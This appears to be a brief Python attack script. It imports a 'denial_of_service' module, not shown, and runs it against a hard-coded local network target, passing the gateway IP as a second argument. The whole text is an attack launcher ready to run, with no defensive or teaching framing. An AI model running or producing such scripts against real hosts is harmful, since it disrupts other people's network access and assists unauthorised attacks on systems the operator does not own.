
from modules.denial_of_service import *

gateway_ip_addr = "192.168.0.1"
target_ip_addr = "192.168.0.13" 

denial_of_service(target_ip_addr, gateway_ip_addr)